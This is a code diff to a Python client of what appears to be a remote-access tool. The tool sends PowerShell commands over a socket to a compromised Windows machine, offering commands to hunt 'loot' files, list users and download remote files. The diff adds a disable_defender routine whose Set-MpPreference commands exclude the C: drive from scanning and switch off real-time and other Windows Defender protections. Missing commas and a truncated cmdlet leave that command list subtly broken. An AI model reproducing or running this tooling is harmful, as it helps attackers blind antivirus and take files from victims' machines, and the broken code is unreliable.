@@ -62,9 +62,14 @@ class Client:
             "get_active": self.get_active
         }
 
-    def run_powershell_command(self, command) -> None:
+    def run_powershell_command(self, command: str, print_result: bool = True) -> None:
+        """ Runs a powershell command
+        :param command: Command to run
+        :param print_result: If true the result is printed to the screen
+        """
         self.connection.sendto(command.encode(), self.config.ip_tuple)
-        print(format_string(self.recvall()))
+        if print_result:
+            print(format_string(self.recvall()))
 
     def get_loot(self, command) -> None:
         """ Searches a directory for intresting files
@@ -106,19 +111,38 @@ class Client:
         command = "Get-MpComputerStatus | Select AntivirusEnabled, AMEngineVersion, AMProductVersion, AMServiceEnabled, AntispywareSignatureVersion, AntispywareEnabled, IsTamperProtected, IoavProtectionEnabled, NISSignatureVersion, NISEnabled, QuickScanSignatureVersion, RealTimeProtectionEnabled, OnAccessProtectionEnabled, DefenderSignaturesOutOfDate | Out-String"
         self.run_powershell_command(command)
 
+    def disable_defender(self, command = None) -> None:
+        """ Attempts to disable windows defender
+        """
+        commands = [
+            # Exclude all directories from Windows AV
+            "Set-MpPreference -ExclusionPath C:",
+            # Disable Realtime Scanning & Monitoring
+            "Set-MpPreference -DisableRealtimeMonitoring $true"
+            # Disables Scanning USB's for malware
+            "Set-MpPreference -DisableRemovableDriveScanning $true"
+            # Disables Scanning Archives
+            "Set-MpPreference -DisableArchiveScanning $true"
+            # Disables scanning network drives
+            "MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true"
+        ]
+        for command in commands:
+            self.run_powershell_command(command)
+
     def print_help(self, command = None):
         print("""
 Command         Description
 
-get_antivirus - Gets infomation about Windows Defender
-get_os        - Gets infomation about the current OS build
-get_active    - Lists active TCP connections
-get_bios      - Gets the BIOS's manufacturer name, bios name, and firmware type
-get_public_ip - Makes a network request to api.ipify.org to and returns the computers public IP address
-get_loot      - Searches a directory for intresting files (May take awhile) ... Syntax: get_loot <DIR>
-get_tools     - Checks to see what tools are installed on the system
-get_file      - Downloads a remote file and saves it to your computer ... Syntax: get_file <REMOTE_FILE> <LOCAL_FILE>
-get_users     - Lists all users on the local computer
+get_antivirus    - Gets infomation about Windows Defender
+get_os           - Gets infomation about the current OS build
+get_active       - Lists active TCP connections
+get_bios         - Gets the BIOS's manufacturer name, bios name, and firmware type
+get_public_ip    - Makes a network request to api.ipify.org to and returns the computers public IP address
+get_loot         - Searches a directory for intresting files (May take awhile) ... Syntax: get_loot <DIR>
+get_tools        - Checks to see what tools are installed on the system
+get_file         - Downloads a remote file and saves it to your computer ... Syntax: get_file <REMOTE_FILE> <LOCAL_FILE>
+get_users        - Lists all users on the local computer
+disable_defender - Attempts to disable windows defender with various methods (Requires Admin Priv)
     """)
         self.__send_fake_request()
 
